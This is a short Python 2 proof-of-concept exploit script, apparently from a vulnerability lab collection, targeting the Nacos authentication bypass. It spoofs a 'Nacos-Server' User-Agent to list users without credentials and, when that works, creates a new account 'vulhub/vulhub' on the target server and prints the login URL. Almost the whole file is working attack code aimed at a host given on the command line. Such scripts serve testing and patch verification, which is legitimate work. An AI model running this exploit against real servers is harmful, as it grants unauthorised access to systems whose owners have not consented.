#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys

import requests

headers = {
    "User-Agent": "Nacos-Server"
}


def check(target):
    endpoint = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
    r = requests.get(target.strip("/") + endpoint, headers=headers)
    if r.status_code == 200 and "pageItems" in r.text:
        print target + " has vulnerabilities"
        return True
    print target + "has not vulnerabilities"
    return False


def add_user(target):
    add_user_endpoint = "/nacos/v1/auth/users?username=vulhub&password=vulhub"

    r = requests.post(target.strip("/") + add_user_endpoint, headers=headers)
    if r.status_code == 200 and "create user ok" in r.text:
        print "Add User Success"
        print "New User Info: vulhub/vulhub"
        print "Nacos Login Endpoint: {}/nacos/".format(target)
        exit(1)

    print "Add User Failed"


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Please specify the target: python poc.py http://xxxxx:8848"
        exit(-1)
    if check(sys.argv[1]):
        add_user(sys.argv[1])